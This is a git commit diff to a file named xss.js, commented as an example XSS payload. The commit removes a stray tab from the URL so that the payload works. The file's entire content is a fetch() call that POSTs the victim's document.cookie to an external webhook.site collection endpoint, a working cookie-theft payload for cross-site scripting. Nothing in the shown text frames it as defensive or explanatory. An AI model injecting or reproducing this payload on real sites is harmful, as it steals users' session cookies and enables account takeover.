f0d520e312976cb78dc337ae5dc7c65f197395eb
Neha Iftikhar <116973383+nehaiftikhar@users.noreply.github.com>
2025-06-02 16:11:45 +0500

    xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,5 @@
 // Example XSS payload
-fetch("	https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
+fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
   method: "POST",
   body: document.cookie
 });
